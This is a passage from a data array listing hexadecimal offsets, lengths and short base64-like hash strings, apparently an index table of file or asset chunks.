	[0x37ae0, 0x5a, "wdUufa9g-D8"],
	[0x37ae0, 0x5a, "wdUufa9g-D8"],
	[0x37b00, 0x145, "NpLBpgVV7PU"],
	[0x37b00, 0x145, "NpLBpgVV7PU"],
	[0x37b20, 0x198, "asSKL30+heA"],
	[0x37b40, 0x7a, "VdXIDAbJ3tQ"],
	[0x37b60, 0x196, "tvkQRDe6hNo"],
	[0x37bc0, 0x290, "K7xiuldOPKw"],
	[0x37be0, 0x21, "8vE6Z6VEYyk"],
	[0x37be0, 0x21, "8vE6Z6VEYyk"],
	[0x37c00, 0x29f, "WtR7OVvUgSo"],
	[0x37c40, 0x29, "iiQjzvfWDq0"],
	[0x37c40, 0x29, "iiQjzvfWDq0"],
	[0x37c60, 0x157, "hpoDTzy9Yy0"],
	[0x37ca0, 0x1a1, "mo0bFmWppIw"],
	[0x37cc0, 0x1e8, "0Ma-LQjv6So"],
	[0x37ce0, 0x271, "PIt9WYaoBqU"],
	[0x37d40, 0x80, "NN01qLRhiqU"],
	[0x37d40, 0x80, "NN01qLRhiqU"],
	[0x37d60, 0x22, "ixrw0h2tWuI"],
	[0x37d60, 0x22, "ixrw0h2tWuI"],
	[0x37da0, 0x25b, "9Iem9Wk07xU"],
	[0x37dc0, 0xcc, "OG4RsDwLguo"],
	[0x37dc0, 0xcc, "OG4RsDwLguo"],
	[0x37e20, 0xf0, "NhpspxdjEKU"],
	[0x37e60, 0x65, "UTR6wAkajxk"],
	[0x37e80, 0x195, "k5QQrJEpRYY"],
	[0x37ee0, 0x68, "4boImm4wxu0"],
	[0x37ee0, 0x68, "KuOmgKoqCdY"],
	[0x37ee0, 0x68, "KuOmgKoqCdY"],
	[0x37f00, 0x249, "WaThXSvAQNc"],
	[0x37f20, 0xa, "VAzswvTOCzI"],
	[0x37f20, 0xa, "VAzswvTOCzI"],
	[0x37f40, 0xc4, "f09KvIPy-QY"],
	[0x37f40, 0xc4, "f09KvIPy-QY"],
	[0x37f40, 0xc4, "sfKygSjIbI8"],
	[0x37f60, 0xeb, "SFjw4+HOVOQ"],
	[0x37f80, 0x28f, "KZchfealTT4"],
	[0x37fa0, 0x16a, "nh2IFMgKTv8"],
	[0x37fa0, 0x16a, "nh2IFMgKTv8"],
	[0x37fc0, 0xb6, "4oKwKmeOKjM"],
	[0x38020, 0xbc, "E6ao34wPw+U"],
	[0x38020, 0xbc, "E6ao34wPw+U"],
	[0x38060, 0x2a0, "vpo3SbGFuEk"],
	[0x380a0, 0x1c8, "TJG6tf+yJlY"],
	[0x380c0, 0x20, "6Gwl39KKUEI"],
	[0x380c0, 0x20, "RenI1lL1WFk"],
	[0x380c0, 0x20, "RenI1lL1WFk"],
	[0x38100, 0x1e3, "tPWsbOUGO8k"],
	[0x38160, 0x289, "6eh9QGpaRWw"],
	[0x38180, 0x8c, "2t3V7tfWY5s"],
	[0x381c0, 0x7e, "6w8tPp+Yk6E"],
	[0x381e0, 0x66, "Wx2+2t1mX1E"],
	[0x38220, 0x110, "2G6i6hMIUUY"],
	[0x38220, 0x110, "2G6i6hMIUUY"],
	[0x38240, 0x63, "zsTvhCDrOjQ"],
	[0x38280, 0x2b, "72rYuYoDTWk"],
	[0x38390, 0xea, "smIj7eqzZE8"],
	[0x38390, 0xea, "smIj7eqzZE8"],
	[0x38400, 0x1c6, "04AjkP0jO9U"],
	[0x38420, 0xbd, "A0O5kF5x4LQ"],
	[0x38420, 0xbd, "mqQMh1zPPT8"],
	[0x38420, 0xbd, "mqQMh1zPPT8"],
	[0x38440, 0xed, "ZWNwgNgglzA"],
	[0x38460, 0x86, "TUuiYS2kE8s"],
	[0x38460, 0x86, "TUuiYS2kE8s"],
	[0x384c0, 0x264, "nG-FYqFutUo"],
	[0x384e0, 0x228, "raO+bB7q2cY"],
	[0x38500, 0x1e7, "Pdgml4rbxYk"],
	[0x385d0, 0x2c, "CpF21FIEKVQ"],
	[0x385f0, 0x74, "n88vx3C5nW8"],
	[0x385f0, 0x74, "n88vx3C5nW8"],
	[0x38610, 0x24, "Y2OqwJQ3lr8"],
	[0x38610, 0x24, "Y2OqwJQ3lr8"],
	[0x38630, 0x85, "lvDhwhUC05E"],
	[0x38650, 0x294, "nTc+tFajGqQ"],
	[0x38690, 0x1e2, "QuJYZ2KVGGQ"],
	[0x386d0, 0x75, "hHlZQUnlxSM"],
	[0x386f0, 0x193, "gVaofuRvLdU"],
	[0x38710, 0x189, "YA0r4LCkfeY"],
	[0x38730, 0x270, "Hx-KCms9n4s"]
];
